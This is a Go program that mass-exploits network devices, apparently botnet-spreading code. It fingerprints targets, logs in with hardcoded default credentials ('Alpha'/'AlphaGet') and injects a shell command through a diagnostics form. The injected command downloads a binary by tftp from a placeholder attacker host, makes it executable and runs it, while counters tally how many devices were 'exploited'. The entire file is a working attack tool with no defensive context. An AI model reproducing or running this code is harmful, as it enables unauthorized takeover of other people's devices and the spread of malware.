package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"crypto/tls"
	"io"
	"bytes"
	"strconv"
)
var (
	port = os.Args[1]

	conf = &tls.Config{
		InsecureSkipVerify: true,
		MinVersion: tls.VersionTLS10,
	}

	wg sync.WaitGroup

	timeout = 5 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = "cd%20%2Ftmp%20%3B%20rm%20-rf%20x86%3B%20tftp%20-g%20-r%20x86%20IPHERE%2069%3B%20chmod%20777%20x86%3B.%2Fx86%20x86"
)

func findDevice(target string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "alpha")
}

func getLogin(target string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /login.php HTTP/1.1\r\nReferer: https://" + target + "/net-diags.php\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "alpha")
}

func getCommand(target, sid string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /net-diags.php HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: https://" + target + "\r\nCookie: sid=" + sid + "\r\nReferer: https://" + target + "/net-svcs.php\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "colored")
}

func sendCommand(target, sid string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "cmdbtn=trc_btn_d&val=-c;" + payload
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /net-diags.php HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: https://" + target + "\r\nCookie: sid=" + sid + "\r\nReferer: https://" + target + "/net-diags.php\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return true
}

func loginDevice(target string) string {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return ""
	}

	defer conn.Close()

	ip := strings.Split(target, ":")[0]
	data := "from=https%3A%2F%2F" + ip + "%2Fnet-diags.php&user=Alpha&password=AlphaGet"

	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /gologin.php HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntLen + "\r\nOrigin: https://" + target + "\r\nReferer: https://" + target + "/login.php\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Logging in") {
		if strings.Contains(buff.String(), "document.cookie=\"sid=") {
			sidStr := strings.Split(buff.String(), "document.cookie=\"sid=")

			if len(sidStr) > 1 {
				sid := strings.Split(sidStr[1], ";")

				if len(sid) > 0 {
					return sid[0]
				}
			}
		}
	}

	return ""
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

//	fmt.Printf("[ALPHA] found bot %s\n", target)

	if !getLogin(target) {
		return
	}

	sid := loginDevice(target)

	if sid == "" {
		return
	}

	fmt.Printf("[RALPHA] logged in %s [%s]\n", target, sid)

	sendCommand(target, sid)
	
	if getCommand(target, sid) {
	//	fmt.Printf("[ALPHA] found working %s\n", target)
		exploited++
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}

